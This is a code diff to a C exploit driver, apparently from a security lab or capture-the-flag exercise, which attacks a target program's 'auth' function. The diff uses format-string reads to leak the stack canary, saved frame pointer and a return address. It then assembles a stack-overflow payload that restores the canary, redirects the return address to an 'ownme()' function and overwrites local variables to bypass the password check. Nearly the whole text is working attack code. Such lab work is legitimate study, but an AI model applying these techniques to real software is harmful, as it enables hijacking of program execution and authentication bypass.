@@ -137,17 +137,27 @@ int main(int argc, char* argv[]) {
    void *auth_canary_loc = 0xbfffe88c; // location where auth's canary is stored
    void *auth_bp_loc = 0xbfffe898; // location of auth's saved bp
    void *auth_ra_loc = 0xbfffe89c; // location of auth's return address
- 
+
+   void *auth_user2 = 0xbfffe700; // value of user variable in auth from run #2
+   void *auth_user2_loc = 0xbfffe894; // user variable location from run #2
+   void *auth_pass2_loc = 0xbfffe888; // pass variable location from run #2
+   void *auth_l2_loc = 0xbfffe898; // l variable location from run #2
+
    unsigned int auth_user_auth_ra_loc_diff = auth_ra_loc - auth_user;
    unsigned int auth_user_auth_canary_loc_diff = auth_canary_loc - auth_user;
 
+   unsigned int offset_auth_user2_loc = auth_user2_loc - auth_user2;
+   unsigned int offset_auth_pass2_loc = auth_pass2_loc - auth_user2;
+   unsigned int offset_auth_l2_loc = auth_l2_loc - auth_user2;
+
    // 1. Extract main_loop()'s address
-   put_str("e %431$x %435$x\n"); // returns the adderss of main_loop()
+   put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
    send();
 
    void *main_loop_ra, *canary; // address of main_loop's return address
-   get_formatted("%x%x", &canary, &main_loop_ra); 
-   fprintf(stderr, "driver: Extracted canary: %x main_loop_ra: %x\n", canary, main_loop_ra);
+   void *ebp;
+   get_formatted("%x%x%x", &canary, &ebp, &main_loop_ra); 
+   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", canary, ebp, main_loop_ra);
 
    // 2. Find address of ownme()
    int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
@@ -166,9 +176,14 @@ int main(int argc, char* argv[]) {
    // that we don't have to worry about endianness as long as the exploit is
    // being assembled on the same architecture/OS as the process being
    // exploited.
-   fprintf(stderr, "Setting values at offset: %x %x\n", auth_user_auth_canary_loc_diff/sizeof(void*), auth_user_auth_ra_loc_diff/sizeof(void*));
+   fprintf(stderr, "Setting values at offset: 0x%x 0x%x\n", auth_user_auth_canary_loc_diff/sizeof(void*), auth_user_auth_ra_loc_diff/sizeof(void*));
    expl[auth_user_auth_canary_loc_diff/sizeof(void*)] = canary;
    expl[auth_user_auth_ra_loc_diff/sizeof(void*)] = ownme_addr;
+
+   fprintf(stderr, "Setting values at offset: 0x%x\n", offset_auth_l2_loc/sizeof(void*));
+   expl[offset_auth_l2_loc/sizeof(void*)] = 0; // no length comparison in strcmp
+   expl[offset_auth_user2_loc/sizeof(void*)] = ebp;
+   expl[offset_auth_pass2_loc/sizeof(void*)] = ebp;
 
    // 4. Now, send the payload
    put_str("p xyz\n");
